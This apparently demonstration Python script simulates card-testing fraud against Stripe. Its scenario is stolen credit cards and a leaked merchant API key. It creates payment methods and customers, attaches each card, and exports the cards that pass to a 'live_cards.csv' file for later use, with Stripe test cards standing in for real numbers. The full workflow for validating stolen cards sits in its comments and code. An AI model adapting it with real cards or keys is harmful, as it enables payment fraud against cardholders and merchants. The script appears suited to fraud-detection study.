# Purpose of this script is to simulate card testing
# Scenario - I've purchased some stolen credit card creds from the dark web and a leaked Stripe API key, and want to test if the cards will get declined or not
# Generate the card numbers
# Replace the card numbers with Stripe test cards
# Plug the card creds into the payment methods API
# Generate the customer objects
# Attach the payment method objects to the customer objects
# Store the successful card numbers for future use, and discard the rest

import stripe
import random
import csv
from progress.bar import IncrementalBar


# Read in Stripe API key
with open("keys.txt") as f:
    PASSWORD = ''.join(f.readlines())
    stripe.api_key = str(PASSWORD).split()[0]

# Generate the card numbers/CVC


def random_with_N_digits(n):
    """Accepts an integer n and returns a random number where length = integer"""
    range_start = 10**(n-1)
    range_end = (10**n)-1
    return random.randint(range_start, range_end)

# Generate expiry


def random_expiry(n):
    """Accepts an integer n and returns an expiry date where month is between 1 and 12 and year is between next year and next year + n"""
    month_list = list(range(1, 13))
    month = random.choice(month_list)
    next_year = 2024
    year_list = list(range(next_year, next_year + n + 1))
    year = random.choice(year_list)
    return month, year


# Number of credentials we want to generate
N = 100

# Stripe test cards (randomly generated 16-digit cards won't work in the testmode API)
successful_card = "4242424242424242"
declined_card = "4000000000000002"

# List to store card number, expiry and CVC
creds = []

# Loop to generate N sets of credentials
for i in range(N):
    # Generate random 16 digit card number
    rand_card_num = random_with_N_digits(16)

    # Generate stripe test card
    if rand_card_num % 10 == 0:
        rand_card_num_test = successful_card
    else:
        rand_card_num_test = declined_card

    # Generate random expiry and CVC
    rand_exp = random_expiry(10)
    rand_cvc = random_with_N_digits(3)

    # Add credentials to credential list
    creds.append([str(rand_card_num), rand_card_num_test,
                 rand_exp[0], rand_exp[1], rand_cvc])

# Plug the card creds into the payment methods API

# Progress bar
bar = IncrementalBar('Creating Payment Methods', max=N)

# Call payments method API N times using the credentials from the previous code block
payment_methods = []
for i in range(N):
    pm_object = stripe.PaymentMethod.create(
        type="card",
        card={
            "number": creds[i][1],
            "exp_month": creds[i][2],
            "exp_year": creds[i][3],
            "cvc": creds[i][4],
        },
    )

    payment_methods.append(pm_object.id)

    bar.next()

bar.finish()
print()

# Generate the customer objects
bar = IncrementalBar('Creating Customers', max=N)

# Call the customers API N times
customers = []
for i in range(N):
    cus_name = f"Customer #{i+1}"
    cus_email = f"{random_with_N_digits(12)}@gmail.com"
    cus_object = stripe.Customer.create(name=cus_name, email=cus_email)
    customers.append(cus_object.id)

    bar.next()

bar.finish()
print()

# Attach the payment method objects to the customer objects
successful_payment_methods = []
for i in range(N):
    # Attempt to attach payment method i to customer i
    try:
        stripe.PaymentMethod.attach(
            payment_methods[i],
            customer=customers[i],
        )

    # Outcome: Card declined (throws 402 error - stripe.error.CardError)
    except stripe.error.CardError:
        print(
            f"Declined! Card Number: {creds[i][0]} Card Expiry: {creds[i][2]}/{str(creds[i][3])[2:]} Card CVC: {creds[i][4]}")

    # Outcome: Card succeeded and was successfully attached to the customer object
    else:
        print(
            f"Succeeded! Card Number: {creds[i][0]} Card Expiry: {creds[i][2]}/{str(creds[i][3])[2:]} Card CVC: {creds[i][4]}")

        # Store successful card numbers
        successful_payment_methods.append(creds[i])


# Export the successful card numbers to a CSV file for future use, and discard the rest
header = ["card_number", "card_exp_month", "card_exp_year", "card_cvc"]

with open("live_cards.csv", "w", encoding="UTF8", newline="") as f:
    writer = csv.writer(f)

    # Adds header to CSV
    writer.writerow(header)

    for i in range(len(successful_payment_methods)):
        # Removes the test card, since this is not useful
        successful_payment_methods[i].pop(1)

        # Adds card credentials to next row in CSV file
        writer.writerow(successful_payment_methods[i])
